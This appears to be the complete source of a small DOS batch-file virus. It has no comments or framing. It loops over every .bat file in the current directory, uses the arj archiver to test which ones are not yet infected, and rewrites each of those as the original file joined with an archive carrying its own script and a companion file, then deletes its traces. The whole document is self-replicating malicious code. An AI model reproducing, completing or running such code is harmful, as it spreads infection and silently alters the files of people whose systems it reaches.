if "%1"=="4" goto s
for %%b in (*.bat) do call %0 4 %%b
goto b
:s
if %2==I.BAT goto b
arj l %2 >nul
if errorlevel 1 goto i 
goto b
:i
ren %2 p >l
arj a j i.bat SG >nul
copy /b p+SG+j.arj %2>l
del j.arj
del ?
:b
